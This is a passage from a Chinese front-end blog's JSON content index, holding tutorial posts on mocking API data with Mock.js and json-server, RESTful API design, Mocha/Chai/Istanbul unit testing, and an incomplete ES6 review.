编写可维护的JavaScript","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://ru23.com/tags/读书笔记/"}]},{"title":"前后端分离之数据Mock","slug":"2017-10-js-mock","date":"2017-10-23T11:50:24.000Z","updated":"2018-10-24T03:46:02.188Z","comments":true,"path":"note/30ed4e0c.html","link":"","permalink":"https://ru23.com/note/30ed4e0c.html","excerpt":"","text":"文章内容整理于互联网，方便学习 一、学前预热 为了做到前后端并行开发，数据mock就成为环境搭建的重要一环 1.1 Web应用前后端分离 后台向前台提供API接口,只负责数据的提供和计算，而完全不处理展现 前台通过Http(Ajax)请求获取数据, 在浏览器端动态构建界面显示数据 1.2 利用Node+express提供模拟数据 优点：可以在浏览器端访问 缺点：如果是打包发布就无法访问模拟数据, 只能是测试时使用 修改build/dev-server.js 123456789101112131415161718//加载json数据var apiData = require('../src/mock/data.json')var home = apiData.home;//得到路由器var apiRouter = express.Router()//注册路由apiRouter.get('/home', function (req, res) &#123; res.json(&#123; code: 0, //0代表正确数据 data: seller &#125;)&#125;)//启用路由app.use('/api', apiRouter)//访问http://localhost:8080/api/home 1.3 利用mockjs提供模拟数据 Mockjs: 用来拦截ajax请求, 生成随机数据返回 优点：不可以在浏览器端访问 缺点：打包发布运行模拟接口也是可以用的 123456import Mock from 'mockjs' import apiData from './data.json'Mock.mock('/api2/seller', &#123;code:0, data:apiData.seller&#125;)Mock.mock('/api2/goods', &#123;code:0, data:apiData.goods&#125;)Mock.mock('/api2/ratings', &#123;code:0, data:apiData.ratings&#125;) 1.4 使用postman工具测试接口 postman是用来测试API接口的chrome插件 postman也是一个活接口文档 1.5 ajax请求mock数据接口 vue-resource是用于ajax请求的vue插件 axios是浏览器/服务器端通用的ajax请求库 123456789101112131415161718//使用示例import VueResource from 'vue-resource' Vue.use(VueResource)//组件对象多了$http属性, 使用它发送ajax请求this.$http.get('/api2/seller').then((response) =&gt; &#123; console.log(response.body)&#125;, (response) =&gt; &#123; console.log('失败了')&#125;)import axios from 'axios' axios.get('/api2/seller').then((response) =&gt; &#123; console.log(response.body)&#125;, (response) =&gt; &#123; console.log('失败了')&#125;) 二、数据mock思路 在client端处数据mock 在server端mock 第一种方式拦截了请求的发出，直接返回mock的数据，而第二种方式请求则真实地发出，只是在server端进行route拦截 前后端分离的方式，就是在传统开发模式中加了一个node层，这样数据mock完全可以在node server端完成，基本思路如下 mock 2.1 mock思路说明 只有线下开发模式，才会需要进行数据mock 根据请求的url，拼接形成一个file path 为了避免node缓存，删除require.cache(path) 读取require(path) ，如果该文件不存在或读取失败，则跳转到失败路由。这样简单的数据mock就实现了 2.2 代码描述123456789101112131415161718192021222324252627282930// 伪代码if (process.env.NODE_ENV === 'development') &#123; router.set('/api/*', mockapi)&#125; function mockapi(req, res, opts) &#123; var basePath = url.parse(req.url).pathname; try &#123; var findPath = require.resolve(prefixPath + basePath + '.js'); delete require.cache[findPath] var result = require(findPath); &#125; catch (err) &#123; return next(err); &#125; if (typeof result === 'function') &#123; return result(req, res, opts); &#125; if (typeof result.status === 'undefined' || typeof result.body === 'undefined') &#123; next(new Error('status 或 body 不存在')) return; &#125; res.writeHead(result.status, &#123; 'Content-Type': 'application/json;charset=UTF-8' &#125;); res.write(JSON.stringify(result.body)) res.end(); cb()&#125; 三、Mock.js使用详解3.1 Mock.js实现的功能 让前端攻城师独立于后端进行开发 通过随机数据，模拟各种场景 不需要修改既有代码，就可以拦截 Ajax 请求，返回模拟的响应数据 支持生成随机的文本、数字、布尔值、日期、邮箱、链接、图片、颜色等。 3.2 Mock安装3.2.1 Node下使用12# 安装npm install mockjs 1234567891011// 使用 Mockvar Mock = require('mockjs')var data = Mock.mock(&#123; // 属性 list 的值是一个数组，其中含有 1 到 10 个元素 'list|1-10': [&#123; // 属性 id 是一个自增数，起始值为 1，每次增 1 'id|+1': 1 &#125;]&#125;)// 输出结果console.log(JSON.stringify(data, null, 4)) 3.2.2 RequireJS (AMD)1234567891011121314151617181920// 配置 Mock 路径require.config(&#123; paths: &#123; mock: 'http://mockjs.com/dist/mock' &#125;&#125;)// 加载 Mockrequire(['mock'], function(Mock)&#123; // 使用 Mock var data = Mock.mock(&#123; 'list|1-10': [&#123; 'id|+1': 1 &#125;] &#125;) // 输出结果 document.body.innerHTML += '&lt;pre&gt;' + JSON.stringify(data, null, 4) + '&lt;/pre&gt;'&#125;) 3.3 使用语法 Mock.js 的语法规范包括两部分 数据模板定义规范 数据占位符定义规范 3.3.1 数据模板定义规范 数据模板中的每个属性由 3 部分构成：属性名、生成规则、属性值 1234// 属性名 name// 生成规则 rule// 属性值 value'name|rule': value 属性名 和 生成规则 之间用竖线 | 分隔 生成规则 是可选的 生成规则 有 7 种格式 &#39;name|min-max&#39;: value &#39;name|count&#39;: value &#39;name|min-max.dmin-dmax&#39;: value &#39;name|min-max.dcount&#39;: value &#39;name|count.dmin-dmax&#39;: value &#39;name|count.dcount&#39;: value &#39;name|+step&#39;: value 生成规则 的 含义 需要依赖 属性值的类型 才能确定 属性值 中可以含有 @占位符 属性值 还指定了最终值的初始值和类型 3.3.2 生成规则和示例 属性值是字符串 String &#39;name|min-max&#39;: string 通过重复 string生成一个字符串，重复次数大于等于min，小于等于 max &#39;name|count&#39;: string 通过重复 string生成一个字符串，重复次数等于 count。 属性值是数字Number &#39;name|+1&#39;: number 属性值自动加 1，初始值为 number &#39;name|min-max&#39;: number 生成一个大于等于 min、小于等于 max的整数，属性值 number 只是用来确定类型 &#39;name|min-max.dmin-dmax&#39;: number 生成一个浮点数，整数部分大于等于min、小于等于 max，小数部分保留 dmin 到 dmax 位 12345678910111213Mock.mock(&#123; 'number1|1-100.1-10': 1, 'number2|123.1-10': 1, 'number3|123.3': 1, 'number4|123.10': 1.123&#125;)// =&gt;&#123; \"number1\": 12.92, \"number2\": 123.51, \"number3\": 123.777, \"number4\": 123.1231091814&#125; 属性值是布尔型 Boolean &#39;name|1&#39;: boolean 随机生成一个布尔值，值为 true 的概率是 1/2，值为 false 的概率同样是 1/2 &#39;name|min-max&#39;: value 随机生成一个布尔值，值为 value 的概率是min / (min + max)，值为 !value的概率是 max / (min + max)\\ 属性值是对象 Object &#39;name|count&#39;: object 从属性值 object中随机选取 count个属性 &#39;name|min-max&#39;: object 从属性值 object中随机选取 min 到 max 个属性 属性值是数组 Array &#39;name|1&#39;: array 从属性值 array 中随机选取 1个元素，作为最终值 &#39;name|+1&#39;: array 从属性值 array中顺序选取 1 个元素，作为最终值 &#39;name|min-max&#39;: array 通过重复属性值array 生成一个新数组，重复次数大于等于 min，小于等于 max &#39;name|count&#39;: array 通过重复属性值 array生成一个新数组，重复次数为 count 属性值是函数 Function &#39;name&#39;: function 执行函数 function，取其返回值作为最终的属性值，函数的上下文为属性 &#39;name&#39; 所在的对象 属性值是正则表达式 RegExp &#39;name&#39;: regexp 根据正则表达式 regexp 反向生成可以匹配它的字符串。用于生成自定义格式的字符串 1234567891011Mock.mock(&#123; 'regexp1': /[a-z][A-Z][0-9]/, 'regexp2': /\\w\\W\\s\\S\\d\\D/, 'regexp3': /\\d&#123;5,10&#125;/&#125;)// =&gt;&#123; \"regexp1\": \"pJ7\", \"regexp2\": \"F)\\fp1G\", \"regexp3\": \"561659409\"&#125; 3.3.3 数据占位符定义规范 占位符,只是在属性值字符串中占个位置，并不出现在最终的属性值中 占位符 的格式为 12@占位符@占位符(参数 [, 参数]) 用 @来标识其后的字符串是 占位符 占位符 引用的是 Mock.Random 中的方法 通过 Mock.Random.extend() 来扩展自定义占位符 占位符 也可以引用 数据模板 中的属性 占位符 会优先引用 数据模板 中的属性 占位符 支持 相对路径 和 绝对路径 1234567891011121314151617Mock.mock(&#123; name: &#123; first: '@FIRST', middle: '@FIRST', last: '@LAST', full: '@first @middle @last' &#125;&#125;)// =&gt;&#123; \"name\": &#123; \"first\": \"Charles\", \"middle\": \"Brenda\", \"last\": \"Lopez\", \"full\": \"Charles Brenda Lopez\" &#125;&#125; 3.4 Mock.mock()3.4.1 Mock.mock( template ) 根据数据模板生成模拟数据 12&lt;!-- （必选）加载 Mock --&gt;&lt;script src=\"http://mockjs.com/dist/mock.js\"&gt;&lt;/script&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142// Mock.mock( template )var template = &#123; 'title': 'Syntax Demo', 'string1|1-10': '★', 'string2|3': 'value', 'number1|+1': 100, 'number2|1-100': 100, 'number3|1-100.1-10': 1, 'number4|123.1-10': 1, 'number5|123.3': 1, 'number6|123.10': 1.123, 'boolean1|1': true, 'boolean2|1-2': true, 'object1|2-4': &#123; '110000': '北京市', '120000': '天津市', '130000': '河北省', '140000': '山西省' &#125;, 'object2|2': &#123; '310000': '上海市', '320000': '江苏省', '330000': '浙江省', '340000': '安徽省' &#125;, 'array1|1': ['AMD', 'CMD', 'KMD', 'UMD'], 'array2|1-10': ['Mock.js'], 'array3|3': ['Mock.js'], 'function': function() &#123; return this.title &#125;&#125;var data = Mock.mock(template)$('&lt;pre&gt;').text(JSON.stringify(data, null, 4)) .appendTo('body') 1234567891011121314151617181920212223242526272829303132//res&#123; \"title\": \"Syntax Demo\", \"string1\": \"★★★\", \"string2\": \"valuevaluevalue\", \"number1\": 100, \"number2\": 48, \"number3\": 99.05, \"number4\": 123.6, \"number5\": 123.516, \"number6\": 123.1236370317, \"boolean1\": false, \"boolean2\": true, \"object1\": &#123; \"120000\": \"天津市\", \"130000\": \"河北省\" &#125;, \"object2\": &#123; \"320000\": \"江苏省\", \"330000\": \"浙江省\" &#125;, \"array1\": \"KMD\", \"array2\": [ \"Mock.js\" ], \"array3\": [ \"Mock.js\", \"Mock.js\", \"Mock.js\" ], \"function\": \"Syntax Demo\"&#125; 3.4.2 Mock.mock( rurl, template ) 记录数据模板。当拦截到匹配 rurl 的 Ajax 请求时，将根据数据模板 template生成模拟数据，并作为响应数据返回 12&lt;!-- （必选）加载 Mock --&gt;&lt;script src=\"http://mockjs.com/dist/mock.js\"&gt;&lt;/script&gt; 1234567891011121314// Mock.mock(rurl, template)Mock.mock(/\\.json/, &#123; 'list|1-10': [&#123; 'id|+1': 1, 'email': '@EMAIL' &#125;]&#125;)$.ajax(&#123; url: '1.json', dataType: 'json'&#125;).done(function(data, status, jqXHR)&#123; $('&lt;pre&gt;').text(JSON.stringify(data, null, 4)) .appendTo('body')&#125;) 1234567891011121314151617181920&#123; \"list\": [ &#123; \"id\": 1, \"email\": \"k.sejuwxvego@xcwc.中国互联.公司\" &#125;, &#123; \"id\": 2, \"email\": \"f.hjns@rhivyrvhpb.ve\" &#125;, &#123; \"id\": 3, \"email\": \"g.bdwuuhm@czoybmyp.ms\" &#125;, &#123; \"id\": 4, \"email\": \"n.tkgs@javvkxz.bf\" &#125; ]&#125; 3.4.3 Mock.mock( rurl, function( options ) ) 记录用于生成响应数据的函数。当拦截到匹配 rurl 的 Ajax 请求时，函数 function(options)将被执行，并把执行结果作为响应数据返回 123456789101112131415161718192021222324252627282930313233343536// Mock.mock(rurl, function(options))Mock.mock(/\\.json/, function(options) &#123; return options&#125;)$.ajax(&#123; url: 'hello.json', dataType: 'json'&#125;).done(function(data, status, jqXHR) &#123; $('&lt;pre&gt;').text(JSON.stringify(data, null, 4)) .appendTo('body')&#125;)$.ajax(&#123; url: 'hello.json', dataType: 'json', data: &#123; foo: 1, bar: 2, faz: 3 &#125;&#125;).done(function(data, status, jqXHR) &#123; $('&lt;pre&gt;').text(JSON.stringify(data, null, 4)) .appendTo('body')&#125;)$.ajax(&#123; url: 'hello.json', type: 'post', dataType: 'json', data: &#123; foo: 1, bar: 2, faz: 3 &#125;&#125;).done(function(data, status, jqXHR) &#123; $('&lt;pre&gt;').text(JSON.stringify(data, null, 4)) .appendTo('body')&#125;) 123456789101112131415&#123; \"url\": \"hello.json?foo=1&amp;bar=2&amp;faz=3\", \"type\": \"GET\", \"body\": null&#125;&#123; \"url\": \"hello.json\", \"type\": \"GET\", \"body\": null&#125;&#123; \"url\": \"hello.json\", \"type\": \"POST\", \"body\": \"foo=1&amp;bar=2&amp;faz=3\"&#125; 3.4.4 Mock.setup() Mock.setup( settings ) 配置拦截 Ajax 请求时的行为。支持的配置项有：timeout 指定被拦截的 Ajax 请求的响应时间，单位是毫秒。值可以是正整数，例如 400，表示 400 毫秒 后才会返回响应内容；也可以是横杠 &#39;-&#39; 风格的字符串，例如 &#39;200-600&#39;，表示响应时间介于 200 和 600 毫秒之间。默认值是&#39;10-100&#39; 123456Mock.setup(&#123; timeout: 400&#125;)Mock.setup(&#123; timeout: '200-600'&#125;) 目前，接口 Mock.setup( settings )仅用于配置 Ajax 请求 3.4.5 Mock.Random Mock.Random 是一个工具类，用于生成各种随机数据 Mock.Random的方法在数据模板中称为『占位符』，书写格式为 @占位符(参数 [, 参数]) 1234567var Random = Mock.RandomRandom.email()// =&gt; \"n.clark@miller.io\"Mock.mock('@email')// =&gt; \"y.lee@lewis.org\"Mock.mock( &#123; email: '@email' &#125; )// =&gt; &#123; email: \"v.lewis@hall.gov\" &#125; 四、简单构建一套mock-server 为了更好的分工合作，让前端能在不依赖后端环境的情况下进行开发，其中一种手段就是为前端开发者提供一个 web 容器，这个本地环境就是 mock-server 一个比较好的 mock-server 该有的能力 与线上环境一致的接口地址，每次构建前端代码时不需要修改调用接口的代码 所改即所得，具有热更新的能力，每次增加修改 mock 接口时不需要重启 mock 服务，更不用重启前端构建服务 能配合 Webpack mock 数据可以由工具生成不需要自己手动写 能模拟 POST、GET 请求 搭建主要思路 以 json-server 作为 mock 服务器， mock.js 生成mock 数据，利用 gulp + nodemon + browser-sync 监听mock文件的改动重启 node 服务，刷新浏览器，以此达到一种相对完美的 mock-server要求 4.1 json-server 搭配 mock.js 这里以Webpack 的前端工程为例 1cnpm install json-server mockjs --save 在项目根目录新建 mock文件夹，新建 mock/db.js 作为 mock 数据源，mock/server.js作为 mock 服务，mock/routes.js重写路由表 123456789101112131415161718var Mock = require('mockjs');module.exports = &#123; getComment: Mock.mock(&#123; \"error\": 0, \"message\": \"success\", \"result|40\": [&#123; \"author\": \"@name\", \"comment\": \"@cparagraph\", \"date\": \"@datetime\" &#125;] &#125;), addComment: Mock.mock(&#123; \"error\": 0, \"message\": \"success\", \"result\": [] &#125;)&#125;; 这里我们利用 mock.js 生成 mock 数据，可以尽可能的还原真实数据，还可以减少数据构造的复杂度 12345// routes.jsmodule.exports = &#123; \"/comment/get.action\": \"/getComment\", \"/comment/add.action\": \"/addComment\"&#125; 123456789101112131415161718192021222324// server.jsconst jsonServer = require('json-server')const db = require('./db.js')const routes = require('./routes.js')const port = 3000;const server = jsonServer.create()const router = jsonServer.router(db)const middlewares = jsonServer.defaults()const rewriter = jsonServer.rewriter(routes)server.use(middlewares)// 将 POST 请求转为 GETserver.use((request, res, next) =&gt; &#123; request.method = 'GET'; next();&#125;)server.use(rewriter) // 注意：rewriter 的设置一定要在 router 设置之前server.use(router)server.listen(port, () =&gt; &#123; console.log('open mock server at localhost:' + port)&#125;) 启动服务 1$ node mock/server.js 打开 http://localhost:3000/comment/get.action即可查看到我们想要的数据 image.png 是不是这样就算搭建完了我们的 mock-server ？不，并没有。我们可以尝试修改一下 db.js 的文件内容，刷新浏览器发现 mock 数据并没有像我们想象的那样修改。那也就是说每次当我们需要添加 /修改 mock 数据使都需要重启一次 mock 服务 4.2 端口代理 通过 Webpack 配置 proxy 代理 123456789101112131415module.exports = &#123; devServer: &#123; //其实很简单的，只要配置这个参数就可以了 proxy: &#123; '/api/': &#123; target: 'http://localhost:3000', changeOrigin: true, pathRewrite: &#123; '^/api': '' &#125; &#125; &#125; &#125; &#125; 接着在代码里进行 ajax请求就可以写成，这里以 axios 为例子 12345function getComments () &#123; axios.get('api/comment/get.action', &#123;&#125;).then((res) =&gt; &#123; console.log(res.data) &#125;)&#125; 4.3 文件改动自动刷新 我们希望更改 mock文件能和 webpack 热更新一样，所改即所得。这里我使用了 nodemon，利用 gulp 建立自动执行的任务。 1cnpm install gulp gulp-nodemon browser-sync --save 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// gulpfile.js 的代码如下onst path = require('path');const gulp = require('gulp');const nodemon = require('gulp-nodemon');const browserSync = require('browser-sync').create();const server = path.resolve(__dirname, 'mock');// browser-sync 配置，配置里启动 nodemon 任务gulp.task('browser-sync', ['nodemon'], function() &#123; browserSync.init(null, &#123; proxy: \"http://localhost:8080\", // 这里的端口和 webpack 的端口一致 port: 8081 &#125;);&#125;);// browser-sync 监听文件gulp.task('mock', ['browser-sync'], function() &#123; gulp.watch(['./mock/db.js', './mock/**'], ['bs-delay']);&#125;);// 延时刷新gulp.task('bs-delay', function() &#123; setTimeout(function() &#123; browserSync.reload(); &#125;, 1000);&#125;);// 服务器重启gulp.task('nodemon', function(cb) &#123; // 设个变量来防止重复重启 var started = false; var stream = nodemon(&#123; script: './mock/server.js', // 监听文件的后缀 ext: \"js\", env: &#123; 'NODE_ENV': 'development' &#125;, // 监听的路径 watch: [ server ] &#125;); stream.on('start', function() &#123; if (!started) &#123; cb(); started = true; &#125; &#125;).on('crash', function() &#123; console.error('application has crashed!\\n') stream.emit('restart', 10) &#125;)&#125;); 这样以后我们在构建我们 Webpack 工程时只需要先执行 npm run dev 之后新建 terminal 执行 gulp mock 就可以搭建一个随改随变的 mock-server 环境 完整的代码详情 https://github.com/poetries/mock-server","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"Mock","slug":"Mock","permalink":"https://ru23.com/tags/Mock/"}]},{"title":"初探RESTful API","slug":"2017-10-restful-api","date":"2017-10-23T08:35:24.000Z","updated":"2018-10-24T03:46:02.202Z","comments":true,"path":"note/5d687d0f.html","link":"","permalink":"https://ru23.com/note/5d687d0f.html","excerpt":"","text":"一、RESTful API 简介 image.png image.png image.png 总结一下什么是RESTful架构 每一个URI代表一种资源 客户端和服务器之间，传递这种资源的某种表现层 客户端通过四个HTTP动词(GET、POST、PUT、DELETE)，对服务器端资源进行操作，实现”表现层状态转化” 二、RESTful API 设计2.1、协议 API与用户的通信协议，总是使用HTTPs协议 2.2、域名 应该尽量将API部署在专用域名之下 1https://api.example.com 如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下 1https://example.org/api/ 2.3、版本（Versioning） 应该将API的版本号放入URL 1https://api.example.com/v1/ 2.4、路径（Endpoint） 表示API的具体网址 在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词 举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样 123https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/employees 2.5、HTTP动词 对于资源的具体操作类型，由HTTP动词表示 GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。 PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。 DELETE（DELETE）：从服务器删除资源。 下面是一些例子 12345678GET /zoos：列出所有动物园POST /zoos：新建一个动物园GET /zoos/ID：获取某个指定动物园的信息PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）DELETE /zoos/ID：删除某个动物园GET /zoos/ID/animals：列出某个指定动物园的所有动物DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物 2.6、过滤信息 如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果 下面是一些常见的参数 ?limit=10：指定返回记录的数量 ?offset=10：指定返回记录的开始位置。 ?page=2&amp;per_page=100：指定第几页，以及每页的记录数。 ?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。 ?animal_type_id=1：指定筛选条件 参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的 2.7、状态码 服务器向用户返回的状态码和提示信息 2.8、错误处理 如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可 123&#123; error: \"Invalid API key\"&#125; 2.9、返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范 123456GET /collection：返回资源对象的列表（数组）GET /collection/resource：返回单个资源对象POST /collection：返回新生成的资源对象PUT /collection/resource：返回完整的资源对象PATCH /collection/resource：返回完整的资源对象DELETE /collection/resource：返回一个空文档 2.10、Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么 比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档 123456&#123;\"link\": &#123; \"rel\": \"collection https://www.example.com/zoos\", \"href\": \"https://api.example.com/zoos\", \"title\": \"List of zoos\", \"type\": \"application/vnd.yourformat+json\"&#125;&#125; 上面代码表示，文档中有一个link属性，用户读取这个属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址），href表示API的路径，title表示API的标题，type表示返回类型 三、参考资料 restful_api","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"RESTful API","slug":"RESTful-API","permalink":"https://ru23.com/tags/RESTful-API/"}]},{"title":"Mocha+Chai+Istanbul单元测试","slug":"2017-10-unit-test-mocha-chai","date":"2017-10-22T07:35:43.000Z","updated":"2018-10-24T03:46:02.204Z","comments":true,"path":"note/fac8b8e7.html","link":"","permalink":"https://ru23.com/note/fac8b8e7.html","excerpt":"","text":"一、简介 Istanbul是JavaScript程序的代码覆盖率工具 Mocha是一种测试框架，也就是运行测试的工具。用descibe和it方法，来定义test suit，为不同的测试分组。 mocha本身并不提供assert断言，所以要提供更加有表现力的断言，可以搭配chai使用，当然也可以使用nodejs提供的assert模块 二、配置测试环境安装相应的依赖包 1npm install --save-dev mocha chai istanbul 安装完成之后，在package.json文件的scripts下，添加执行测试和测试覆盖率检查的命令 12345678&#123; \"scripts\":&#123; \"cover\": \"istanbul cover _mocha -- -R spec --timeout 5000 --recursive\", \"cover:check\": \"istanbul check-coverage\", &#125; &#125; 注意，window下必须要这样才可以执行cover 1\"cover\": \"istanbul cover C:\\Users\\Administrator\\Desktop\\test\\node_modules\\mocha\\bin\\_mocha --reporter test/mocha.js\" 运行npm run cover和npm run cover:check，就可以生成测试报告，前者生成测试报告，后者则是检查测试覆盖率是否达到要求 image.png 配置Istanbul istanbul相关的执行参数，可以在命令行下执行时传递参数来制定，也可以在yaml格式的.istanbul.yml文件中配置。简单贴出一些重要的配置项 123456789101112131415161718192021instrumentation: root: . # 执行的根目录 extensions: - .js # 检查覆盖率的文件扩张名 excludes: ['**/benchmark/**'] ... ...reporting: print: summary reports: [lcov, text, html, text-summary] # 生成报告的格式 dir: ./coverage # 生成报告保存的目录 watermarks: # 在不同覆盖率下会显示使用不同颜色 statements: [80, 95] ... ...check: global: statements: 100 branches: 100 lines: 100 functions: 100 最后的check是项目要通过覆盖率检查需要达到的测试覆盖率，测试覆盖率包括四个维度，分别是语句覆盖率、分支覆盖率、行覆盖率和函数覆盖率。如果达不到设定的指标，在执行的时候会报错，项目的测试就无法通过自动化的持续集成 三、编写测试代码 利用chai提供的expect断言，我们可以用BDD的方式，写出更加符合代码预期行为的测试用例. 通常，测试脚本与所要测试的源码脚本同名，但是后缀名为.test.js（表示测试）或者.spec.js（表示规格）。比如，add.js的测试脚本名字就是add.test.js 123456789101112131415161718192021222324252627282930313233const &#123;should, expect, assert&#125; = require('chai');describe('#math', () =&gt; &#123; describe('add', () =&gt; &#123; it('should return 5 when 2 + 3', () =&gt; &#123; expect(add(2, 3), 5); &#125;); it('should return 5 when 2 + 3', () =&gt; &#123; expect(add(2, -3), -1); &#125;); &#125;); describe('mul', () =&gt; &#123; it('should return 6 when 2 * 3', () =&gt; &#123; expect(mul(2, 3), 6); &#125;); &#125;); describe('cover', () =&gt; &#123; it('should return 1 when cover(2, 1)', () =&gt; &#123; expect(cover(2, 1)).to.equal(1); &#125;); it('should return 3 when cover(1, 2)', () =&gt; &#123; expect(cover(1, 2)).to.equal(3); &#125;); it('should return 4 when cover(2, 2)', () =&gt; &#123; expect(cover(2, 2)).to.equal(4); &#125;); &#125;);&#125;); 测试脚本里面应该包括一个或多个describe块，每个describe块应该包括一个或多个it块 describe中的名字是自己定义的，为了方便查看 describe块称为”测试套件”（test suite），表示一组相关的测试。它是一个函数，第一个参数是测试套件的名称（”加法函数的测试”），第二个参数是一个实际执行的函数 it块称为”测试用例”（test case），表示一个单独的测试，是测试的最小单位 四、断言库的用法 所谓”断言”，就是判断源码的实际执行结果与预期结果是否一致，如果不一致就抛出一个错误 所有的测试用例（it块）都应该含有一句或多句的断言。它是编写测试用例的关键。断言功能由断言库来实现，Mocha本身不带断言库，所以必须先引入断言库 1var expect = require('chai').expect; 断言库有很多种，Mocha并不限制使用哪一种。上面代码引入的断言库是chai，并且指定使用它的expect断言风格。chai包含了几种风格，如should expect assert。expect断言的优点是很接近自然语言. 1234567891011121314151617181920212223242526// 相等或不相等expect(4 + 5).to.be.equal(9);expect(4 + 5).to.be.not.equal(10);expect(foo).to.be.deep.equal(&#123; bar: 'baz' &#125;);// 布尔值为trueexpect('everthing').to.be.ok;expect(false).to.not.be.ok;// typeofexpect('test').to.be.a('string');expect(&#123; foo: 'bar' &#125;).to.be.an('object');expect(foo).to.be.an.instanceof(Foo);// includeexpect([1,2,3]).to.include(2);expect('foobar').to.contain('foo');expect(&#123; foo: 'bar', hello: 'universe' &#125;).to.include.keys('foo');// emptyexpect([]).to.be.empty;expect('').to.be.empty;expect(&#123;&#125;).to.be.empty;// matchexpect('foobar').to.match(/^foo/); 基本上，expect断言的写法都是一样的。头部是expect方法，尾部是断言方法，比如equal、a/an、ok、match等。两者之间使用to或to.be连接 如果expect断言不成立，就会抛出一个错误。事实上，只要不抛出错误，测试用例就算通过。 五、持续集成 完成所有代码之后，我们可以将代码发布到github，然后使用持续集成工具travis检查代码，将生成的测试报告上传到coverall上，这样就可以在项目中显示项目状态和测试覆盖率的badges 持续集成是一种软件开发流程 频繁将代码集成到主干 每次集成都通过自动化的构建来验证 尽早发现错误 防止防止大幅偏离主干 通常的nodejs项目.travis.yml配置如下 1234567891011121314language: node_jsnode_js: - \"6\" - \"8\"brancher: only: - \"dev\" - \"master\"install: - \"npm install\" - \"npm install -g codecov\"script: - \"npm run cover\" - \"codecov\" 测试代码预览 https://github.com/poetries/test 六、Mocha的命令行参数 --help或-h参数，用来查看Mocha的所有命令行参数 --reporter, -R --reporter参数用来指定测试报告的格式，默认是spec格式 123$ mocha# 等同于$ mocha --reporter spec","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"测试","slug":"测试","permalink":"https://ru23.com/tags/测试/"}]},{"title":"ECMAScript6回顾","slug":"2017-10-es6-review","date":"2017-10-21T12:20:43.000Z","updated":"2018-10-24T03:46:02.147Z","comments":true,"path":"note/7efe3a88.html","link":"","permalink":"https://ru23.com/note/7efe3a88.html","excerpt":"","text":"整理于互联网，整理最常用的部分，完善中…. 参考资料: http://es6.ruanyifeng.com 第一部分：扩展1.1、let和const const声明一个只读的常量。一旦声明，常量的值就不能改变 let不允许在相同作用域内，重复声明同一个变量 for循环的计数器，就很合适使用let命令 不存在变量提升 会创建块级作用域 1.2、变量的解构赋值数组解构赋值应用场景 变量交换 12[a,b] = [b,a]` 选择性接收某些变量 123456function fn() &#123; return [1,2,3,4,5]&#125;[a,,,b] = fn();// a = 1,b = 4 不确定返回数组长度，只关心第一个 1[a,...b] = [1,2,3,4,5] 对象解构赋值场景 服务端返回的json解构应用 1234567891011let metaData = &#123; title: \"hah\", test: [ &#123; title:\"poetries\", desc: \"test_data\" &#125; ]&#125;let &#123;title:esTitle,test:[&#123;title:cnTitle,desc:cnDesc&#125;]&#125; = metaData; 1.3、字符串扩展 模板字符串是增强版的字符串，用反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串. 12345678910111213// 普通字符串`In JavaScript '\\n' is a line-feed.`// 多行字符串`In JavaScript this is not legal.`console.log(`string text line 1string text line 2`);// 字符串中嵌入变量let name = \"Bob\", time = \"today\";`Hello $&#123;name&#125;, how are you $&#123;time&#125;?` 1.4、数值扩展Number.isFinite(), Number.isNaN() Number.isFinite()用来检查一个数值是否为有限的 12345678Number.isFinite(15); // trueNumber.isFinite(0.8); // trueNumber.isFinite(NaN); // falseNumber.isFinite(Infinity); // falseNumber.isFinite(-Infinity); // falseNumber.isFinite(&apos;foo&apos;); // falseNumber.isFinite(&apos;15&apos;); // falseNumber.isFinite(true); // false Number.isNaN()用来检查一个值是否为NaN 1234567Number.isNaN(NaN) // trueNumber.isNaN(15) // falseNumber.isNaN(&apos;15&apos;) // falseNumber.isNaN(true) // falseNumber.isNaN(9/NaN) // trueNumber.isNaN(&apos;true&apos;/0) // trueNumber.isNaN(&apos;true&apos;/&apos;true&apos;) // true Number.parseInt(), Number.parseFloat() ES6将全局方法parseInt()和parseFloat()，移植到Number对象上面，行为完全保持不变 1.5、数组扩展扩展运算符 扩展运算符是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列 12345678console.log(...[1, 2, 3])// 1 2 3console.log(1, 